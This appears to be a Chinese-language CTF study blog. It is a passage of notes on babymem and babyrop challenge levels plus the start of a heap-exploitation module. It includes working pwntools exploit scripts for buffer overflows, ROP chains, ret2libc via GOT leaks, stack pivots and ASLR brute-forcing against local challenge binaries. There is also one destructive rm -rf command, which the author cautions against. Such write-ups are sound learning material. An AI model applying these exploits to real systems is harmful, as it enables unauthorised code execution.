class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">In [<span class="hljs-number">8</span>]: <span class="hljs-keyword">import</span> pwn <br>   ...:  <br>   ...: pwn.context.encoding = <span class="hljs-string">&quot;latin-1&quot;</span> <br>   ...:  <br>   ...: <span class="hljs-keyword">with</span> pwn.process(<span class="hljs-string">&quot;/challenge/babymem_level15.0&quot;</span>) <span class="hljs-keyword">as</span> target: <br>   ...:     <span class="hljs-keyword">with</span> pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1337</span>) <span class="hljs-keyword">as</span> remote: <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Payload size:&quot;</span>, <span class="hljs-string">b&quot;100\n&quot;</span>) <br>   ...:         remote.writeafter(<span class="hljs-string">b&quot;Send your payload&quot;</span>, <span class="hljs-string">b&quot;test&quot;</span>) <br>   ...:         pwn.info(remote.clean().decode()) <br>   ...:                                                                                                                                                       <br>[x] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span><br>[+] Starting local process <span class="hljs-string">&#x27;/challenge/babymem_level15.0&#x27;</span>: pid <span class="hljs-number">7046</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span><br>[x] Opening connection to localhost on port <span class="hljs-number">1337</span>: Trying <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>[+] Opening connection to localhost on port <span class="hljs-number">1337</span>: Done<br>[*]  (up to <span class="hljs-number">100</span> <span class="hljs-built_in">bytes</span>)!<br>    You sent <span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>!<br>    Let<span class="hljs-string">&#x27;s see what happened with the stack</span><br></code></pre></div></td></tr></table></figure><h1 id="module-A-rop"><a href="#module-A-rop" class="headerlink" title="module A-rop"></a>module A-rop</h1><p>ROP</p><ul><li>rp++, ROPgadget.<ul><li><code>rp++ --unique -r2 -f /bin/bash | grep -P &quot;(add|sub|mov) rax, r..&quot;</code> </li></ul></li><li>store addresses into registers</li><li>stack pivot: 栈转移.</li><li>data transfer.</li><li>USE INFO IN THE STACK OR REGISTERS.</li></ul><p>Counter-CFI(Control Flow Integrity) techniques:</p><ul><li><input disabled="" type="checkbox"> <strong>B(lock)OP:</strong> ROP on a block (or multi-block) level by carefully compensating for side-effects.</li><li><input checked="" disabled="" type="checkbox"> <strong>J(ump)OP:</strong> instead of returns, use indirect jumps to control execution flow</li><li><input disabled="" type="checkbox"> <strong>C(all)OP:</strong> instead of returns, use indirect calls to control execution flow</li><li><input checked="" disabled="" type="checkbox"> <strong>S(ignreturn)ROP:</strong> instead of returns, use the sigreturn system call </li><li><input disabled="" type="checkbox"> <strong>D(ata)OP:</strong> instead of hijacking control flow, carefully overwrite the program’s data to puppet it</li></ul><p><strong>Intel Edition(endbr64 after ret instruction)</strong> is still bypassable by some advanced ROP techniques (<u>Block Oriented Programming, SROP, etc</u>), but it will significantly complicate exploitation.</p><p><a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">Hacking blind</a>:</p><ul><li>The standard blind attack requires a <strong>forking service</strong>. 就像</li><li>Break ASLR and the canary byte-by-byte. Now we can redirect memory semi-controllably.</li><li>Redirect memory until we have a <em>survival signal</em> (i.e., an address that doesn’t crash).</li><li>Use the survival signal to find non-crashing ROP gadgets.</li><li>Find functionality to produce output.</li><li>Leak the program.</li><li>Hack it.</li></ul><p>所谓的libc.so.6其实也就是一个符号链接. 如果要更改libc文件直接临时修改一下符号链接<strong>还要注意ld和libc的匹配问题</strong>. 或者使用patchelf改一下, 链接<a href="https://bbs.pediy.com/thread-254868-1.htm">在这</a>. (那个glibc_all_in_one就在这儿用的)(成天用的都是工具, 真想自己写一个)</p><img src="../../image/pwn-modules/image-20220507102703295.png" alt="image-20220507102703295" style="zoom:80%;" /><blockquote><p>YouTube-42视频是rop的新用法… pwntool还内置了rop. 真行啊.</p></blockquote><h4 id="level1-1"><a href="#level1-1" class="headerlink" title="level1"></a>level1</h4><p>啥主要的保护也没开, 简单的覆盖返回地址.</p><h4 id="level2-1"><a href="#level2-1" class="headerlink" title="level2"></a>level2</h4><p>没开啥保护, 查了一下lseek的使用, 主要就是win函数分成了两个阶段, 一次读一半.</p><p>只要在栈上弄两个返回地址就行了. 简单</p><h4 id="level3-2"><a href="#level3-2" class="headerlink" title="level3"></a>level3</h4><p>5个stage, 每个stage都要有对应数字的参数, 简单跳过.</p><h4 id="level4-3"><a href="#level4-3" class="headerlink" title="level4"></a>level4</h4><p>有一整个函数用来提供gadgets.</p><img src="../../image/pwn-modules/image-20220505210342026.png" alt="image-20220505210342026" style="zoom:80%;" /><p>利用这几个gadgets就可以实现chmod系统调用了. (或者execve)</p><p>rdi是’/flag’字符串的地址, 存在栈上. 鉴于栈空间会不断的减少, 就存在challenge的栈帧中. </p><p>好吧, 这栈地址会变化的. 大意了, 栈帧底部有一个变量.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p=process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27; at: 0x&#x27;</span>)<br>buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>rbp = buf + <span class="hljs-number">0x50</span><br>log.info(<span class="hljs-built_in">hex</span>(rbp))<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">init-pwndbg</span><br><span class="hljs-string">si</span><br><span class="hljs-string">b *challenge+86</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;/flag\x00&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">6</span>), <span class="hljs-number">0</span>, <span class="hljs-number">0x4015fb</span>, buf, <span class="hljs-number">0x40161b</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x40160c</span>, <span class="hljs-number">90</span>, <span class="hljs-number">0x4015e3</span>])<br>p.sendline(pl)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="level5-4"><a href="#level5-4" class="headerlink" title="level5"></a>level5</h4><p>这一题在上一题的基础之上, 没有提示buf的所在位置.</p><p>突然想起来babyjail里面有一个openat. 我或许可以用<code>fchmodat</code>.</p><p>想出来了一个奇奇怪怪的方法, 在IDA中搜索到了字节序列<code>&#39;\x66\x00&#39;</code>, 就是字符串<code>f\0</code>的表示,<br>在这之前要先使用<code>ln -s /flag /home/hacker/f</code>命令来创建符号链接, 再使用python来生成input,<br>最后再命令行中这样执行文件<code>/challenge/babyrop_level5.1 &lt;input 6&lt;.</code>, 这样就行了.<br>或许可以使用别的字符串. 比如一些函数名.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#连续装四个参数和rax系统调用号.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d7b</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0x401d63</span>, <span class="hljs-number">0x403EC8</span>, <span class="hljs-number">0x401d5c</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401d54</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401d74</span>, <span class="hljs-number">268</span>, <span class="hljs-number">0x401d8b</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure><p>想出来这个是因为不知道怎么leak栈上的地址, 估计下几个level得直接完蛋吧…….</p><p><del>看以前的ctf发现也许可以使用write函数来打印栈上的内容, 肯定有一个指向栈上的指针的. 比如说main的rbp.</del>没事了, write的地址也得是指向栈的指针, 属于是鸡和蛋的问题, 暂时没有新方法.</p><h4 id="level6-4"><a href="#level6-4" class="headerlink" title="level6"></a>level6</h4><p>这次没有了syscall, 只有一个现成的函数<code>force_import</code>, gadget也少了几个. 不过也简单. 保护没有变化.</p><img src="../../image/pwn-modules/image-20220506101348091.png" alt="image-20220506101348091" style="zoom:80%;" /><p>再加上challenge结束时的寄存器值:</p><img src="../../image/pwn-modules/image-20220506104816965.png" alt="image-20220506104816965" style="zoom:80%;" /><p>这样的话只要改改rdi rsi. (open多参数到底有没有问题???)</p><ul><li>但是rsi同时作为open的oflag和sendfile的in_fd, 按理来说open一般会开出来3, 那么oflag就得是3了, 但很明显不能是3, 这样标志位会有冲突. 那么用一个文件占用fd3, 这样就会开到4. 如果oflag是4的话会被识别为只读. </li><li>接下来就是rdi的问题, open的参数是一个指向字符串的地址(‘e’, null-terminal string at 0x400457), 还要被用在sendfile的out_fd中, 而fd是int类型, 加上文件固定低地址执行, 这样子还要在命令行中开一个fd为4195415(0x400457)的输出文件.</li></ul><p>然后发现bash并不能打开超过9的fd. 由操作系统分配的fd, bash是怎么控制的? 为什么只提供0-9?</p><p>一次执行这个函数有困难也可以执行两次.</p><ul><li>第一次open(‘e’, 4), send(‘f’, 4, 0, 0x7f……), sendfile失败.</li><li>第二次直接跳到sendfile(1, 3, 0, 60), 因为open函数会修改rdi rsi等等, 从函数入口开始执行那ROP设置的寄存器值就失效了.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level4.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x50</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401b6a</span>, <span class="hljs-number">0x400458</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0x401B3F</span>])<br>pl+= flat([<span class="hljs-number">0x401b6a</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0x401b82</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0x401b7a</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x401b72</span>, <span class="hljs-number">60</span>, <span class="hljs-number">0x401B56</span>, <span class="hljs-number">0</span>])<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(pl)<br></code></pre></div></td></tr></table></figure><hr><ul><li>我开了aslr才能在gdb里面进行输入, 具体原因未知.</li><li>搞清楚了open的一些东西<ul><li>oflag用4字节中最低2bits表示, 按数值区别. mode参数只有在创建新文件的时候使用, <strong>一般可忽略</strong>.</li><li>libc中的open函数最终都会调用openat, 这样既能接受绝对地址也能接受相对地址.</li></ul></li></ul><h4 id="level7-3"><a href="#level7-3" class="headerlink" title="level7"></a>level7</h4><p>直接给我system函数的地址.</p><p>本地成功了, 现查system函数和/bin/sh字符串的偏移直接写出脚本, 但是远程不仅没法attach, 还不能strace, 明明就是那个偏移却运行不了. 难不成想让我用别的方法?</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level7.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-comment">#p = process(&#x27;ltrace &#x27;+binary, shell=True)</span><br>p = process(binary)<br>p.recvuntil(<span class="hljs-string">b&#x27;is: 0x&#x27;</span>)<br>sys_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>log.info(<span class="hljs-built_in">hex</span>(sys_addr))<br>binsh = sys_addr+<span class="hljs-number">0x13f112</span><br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x63</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">0x8</span>), <span class="hljs-number">0x401af3</span>, binsh, sys_addr])<br>p.sendline(pl)<br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>p.recvall()<br></code></pre></div></td></tr></table></figure><h4 id="level8-3"><a href="#level8-3" class="headerlink" title="level8"></a>level8</h4><p>本地成功了, 远程懒得试.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level8.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(binary)<br>elf = ELF(binary)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;) 通过maps找到对应libc文件.</span><br>libc = ELF(<span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;</span>) <span class="hljs-comment">#本地测试libc文件.</span><br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>], elf.sym[<span class="hljs-string">&#x27;challenge&#x27;</span>]])<br>sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *challenge+0x39</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>p.sendline(pl)<br>p.recvuntil(<span class="hljs-string">b&#x27;ving!\n&#x27;</span>)<br>puts = <span class="hljs-built_in">int</span>.from_bytes(p.recv(<span class="hljs-number">6</span>), byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>base = puts - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x80</span>+<span class="hljs-number">8</span>), <span class="hljs-number">0x401b33</span>, binsh, sys])<br>p.sendline(pl)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h4 id="level9-3"><a href="#level9-3" class="headerlink" title="level9"></a>level9</h4><p><strong>stack pivot!!!!</strong> </p><p>以前做过了.</p><p>pop_rbp, bss_s<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="这里要指向2处的地址, 也就是bss+0x10">[1]</span></a></sup>, challenge || leave_ret, 0(useless rbp), pop_rdi<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.">[2]</span></a></sup> || got[puts], plt[puts]<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="这之后要接收puts的地址. ">[3]</span></a></sup>, pop_rdi || str_binsh, system.</p><h4 id="level10-3"><a href="#level10-3" class="headerlink" title="level10"></a>level10</h4><p>开了PIE, 而且win是用mmap分配到一个随机的地址, 然后只给读和执行的权限, 所以主要利用的gadget还是在libc_csu_init里面的. 而aslr的开启导致stack的位置也是未知的.</p><p><del>由于gadget是在rodata段, ROPgadget无法分析, 所以在pwndbg中使用rop命令来分析mmap+mprotect后的区域.</del><br><del>注意只有最后3位是有用的.</del>  rodata段是win函数, 通过mmap+memcpy复制到高地址空间中.</p><blockquote><p>如果该段不可执行ropgadget也不会对这里进行分析.</p></blockquote><hr><p>不过在这一题中<strong>直接给出了buf的位置</strong>.</p><p>mmap的空间总是在ld共享库的上方, 和stack没有关联. 不过challeng中mmap的返回值就存在栈上, 也就是buf的上方8字节.<br>需要栈转移来将这个指针作为ret_address, 这样就可以直接跳到win.</p><p>因为有aslr, 所以gadget之间的数据需要固定一个值, 这个值可以在开了aslr的gdb中获取, 然后不断尝试直到新的一次第四位刚好和选中的值相等.</p><p>这次的幸运数字是0xd57000. 所有在ida看到的地址都要加上这一个偏移量.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level10.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *challenge+0x109</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x88</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x3b\x87&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>: <br>        p.kill()<br></code></pre></div></td></tr></table></figure><p>远程跑总是有点问题, 没法调试. 懒得管了.</p><img src="../../image/pwn-modules/image-20220507162940280.png" alt="image-20220507162940280" style="zoom:80%;" /><h4 id="level11-3"><a href="#level11-3" class="headerlink" title="level11"></a>level11</h4><p>和上一题一样, 不过challenge()函数的主逻辑前后都加上了超级多的nop作为填充. 这有啥用?</p><p>确实没有区别. 改一改偏移量就过了.</p><h4 id="level12-2"><a href="#level12-2" class="headerlink" title="level12"></a>level12</h4><p>保护没有变化. 这又有什么区别?? 0号程序还提供了win函数的地址, 这不白给么.</p><ul><li>突然就不行了, 使用gdb的record来查找问题, 好像只能在当前执行过程中使用save和restore命令.</li><li>ROPgadget使用only命令的时候想要的命令要全部打出来, 而不仅是或的关系.</li><li><code>find /tmp -atime +5 -exec rm -rf &#123;&#125; +</code> 还是别用了.</li><li><code>egrep &#39;(pop (rbp|rsp))|leave&#39; -a libc233.gadget</code> ==<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc-2.33.so --only &#39;pop|ret&#39;</code> </li></ul><p>这题原来指的是从libc中进行ROP, 因为main函数返回到了高地址中的libc.so中.可以直接在libc文件中搜索可执行的ROP段.<del>也不一定要leave, <code>pop rsp</code>不照样行.</del>还是不行. 乖乖leave吧.</p><p>2.33中:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#0x000000000004e250 : leave ; ret</span><br><span class="hljs-number">0x000000000002798b</span> : pop rsp ; ret  <br><span class="hljs-number">0x0000000000027e3f</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret<br><span class="hljs-number">0x0000000000027c27</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret<br></code></pre></div></td></tr></table></figure><blockquote><p>2.31中:</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x00000000000578f8</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret</span><br><span class="hljs-number">0x00000000000c7ad3</span> : <span class="hljs-keyword">leave</span> <span class="hljs-comment">; ret 0xfff6</span><br></code></pre></div></td></tr></table></figure><p>main返回地址到libc偏移: 0x270b3</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#这个是main函数的返回地址</span><br>pwndbg&gt; vmmap <span class="hljs-number">0x7efef009a7ed</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x7efef0099000</span>     <span class="hljs-number">0x7efef01e1000</span> r-xp   <span class="hljs-number">148000</span> <span class="hljs-number">26000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="hljs-number">2.33</span>.so +<span class="hljs-number">0x17ed</span><br>    <br><span class="hljs-comment">#到libc初始的偏移是`0x277ed`:</span><br>pwndbg&gt; distance <span class="hljs-number">0x7f6b0c0fb000</span> <span class="hljs-number">0x7f6b0c1227ed</span><br><span class="hljs-number">0x7f6b0c0fb000</span>-&gt;<span class="hljs-number">0x7f6b0c1227ed</span> <span class="hljs-keyword">is</span> <span class="hljs-number">0x277ed</span> <span class="hljs-built_in">bytes</span> (<span class="hljs-number">0x4efd</span> words)<br></code></pre></div></td></tr></table></figure><p>诶得16*16*16分之1的几率啊, 这也太低了点, 不过想不出来了, 就这么干. <code>0x254000+0x4e250=0x2A2250</code> </p><blockquote><p><del>又发现地址好像和libc没什么关系, 是紧挨着ld.so的…</del> 这个方向错了</p><img src="../../image/pwn-modules/image-20220508231821229.png" alt="image-20220508231821229" style="zoom:67%;" /> </blockquote><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>binary = <span class="hljs-string">&#x27;./babyrop_level12.1.elf64&#x27;</span><br>context.binary = binary<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    p = process(binary)<br>    sc = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    b *main+0x19f</span><br><span class="hljs-string">    init-pwndbg</span><br><span class="hljs-string">    lm</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p, gdbscript=sc)</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;located at: 0x&#x27;</span>)<br>    buf = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    pl = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>), buf-<span class="hljs-number">16</span>, <span class="hljs-string">b&#x27;\x50\x22\x2a&#x27;</span>])<br><br>    p.send(pl)<br>    <span class="hljs-built_in">all</span> = p.recvall()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">all</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">all</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        p.kill()<br></code></pre></div></td></tr></table></figure><h4 id="level13-2"><a href="#level13-2" class="headerlink" title="level13"></a>level13</h4><p>看看这题又要搞什么幺蛾子.</p><p>保护全开, 给出buf位置, 可以leak任意一个地址上8字节数据.</p><p>???这不leak一个canary出来, 然后返回地址改成….和上一题一样了. ret2libc</p><h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14"></a>level14</h4><p>socket</p><h1 id="module-B-heap"><a href="#module-B-heap" class="headerlink" title="module B-heap"></a>module B-heap</h1><h4 id="key"><a href="#key" class="headerlink" title="key:"></a>key:</h4><ul><li><p>Dynamic Allocators:</p><ul><li>General Purpose: Doug Lea (pictured) releases <strong>dlmalloc</strong> into public domain in 1987.</li><li>Linux: <strong>ptmalloc</strong> (Posix Thread aware fork of dlmalloc)</li><li>FreeBSD: <strong>jemalloc</strong> (also used in Firefox, Android)</li><li>Windows: Segment Heap, <strong>NT Heap</strong></li><li>Kernel allocators: <strong>kmalloc</strong> (Linux kernel memory allocator)kalloc (iOS kernel memory allocator)</li></ul></li><li><p>managed by the brk and sbrk system calls:</p><ul><li>sbrk(NULL) returns the end of the data segment</li><li>sbrk(delta) expands the end of the data segment by delta bytes</li><li>brk(addr) expands the end of the data segment to addr</li></ul></li></ul><p>ubuntu 2004还在图中粗线框的阶段, 这是由于tcache的引入. 不过这个module并不会深入这个cache.</p><img src="../../image/pwn-modules/image-20220505165437735.png" alt="image-20220505165437735" style="zoom: 50%;" /><ul><li><p>tcache: </p><ul><li>a <strong>caching</strong> layer for “small” allocations (&lt;1032 bytes on amd64)</li><li>makes a <strong>singly-linked-list</strong> using the first word of the free chunk</li><li><strong>very few</strong> security checks</li></ul></li><li><p>setvbuf: scanf and printf will use malloc in themselves for buffering, we can use <code>setvbuf(stdin/out, NULL)</code> to disable it. (and avoiding confusion in heap exploitation.)</p></li><li><p>ptmalloc caches(for review):</p><ul><li>64 singly-linked tcache bins for allocations of size 16 to 1032(functionally “covers” fastbins andsmallbins)</li><li>10 singly-linked “fast” bins for allocations of size up to 160 bytes</li><li>1 doubly-linked “unsorted” bin to quickly stash 